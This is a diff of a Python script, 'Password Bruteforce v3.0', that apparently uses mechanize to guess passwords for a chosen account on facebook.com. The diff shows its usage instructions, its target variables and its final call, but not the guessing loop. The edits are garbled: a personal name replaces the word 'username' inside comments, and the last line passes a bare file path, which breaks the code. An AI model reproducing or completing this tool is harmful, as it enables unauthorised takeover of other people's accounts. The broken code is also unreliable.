@@ -1,7 +1,7 @@
 ''' 			Password Bruteforce v3.0
 1. Install python 3 on your computer or VPS, be carefull ;)
 2. Install the imported modules - mechanize, itertools pip install...
-3. Edit the file variables - username and the lenght range of the password
+3. Edit the file variables - shaiq_iqbal and the lenght range of the password
 4. Run the script - python password_bruteforce_v3.0.py
 Made by: weasley#9884'''
 
@@ -15,7 +15,7 @@ import itertools
 import mechanize
 
 timeout00 = 00
-username = '@user' # <<-- Change the username
+username = '@user' # <<-- Change the shaiq_iqbal
 url = 'https://www.facebook.com/'
 passw00 = 'ZZZZZZZ999999'
 run00 = True
@@ -50,6 +50,6 @@ def inject_byte01(valid):
 		return				
 
 #kur
-inject_byte01(passw00)
+inject_byte01(Password-Cracker-v3.0/password_bruteforce_3.0.py
 
 sys.exit()
